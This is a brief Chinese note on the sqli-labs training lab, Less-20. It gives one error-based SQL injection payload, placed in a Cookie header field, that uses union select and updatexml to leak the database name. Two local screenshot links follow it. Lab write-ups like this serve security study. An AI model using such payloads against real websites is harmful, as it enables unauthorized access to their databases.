title: sql-labs 20关

less-20——基于’的`Cookie:`报头文报错注入

注入语句：

uname=' union select 1,2,(updatexml(1,concat(0x7e, database(),0x7e),1))# ;

![image-20220330104652217](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330104652217.png)

![image-20220330104702725](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330104702725.png)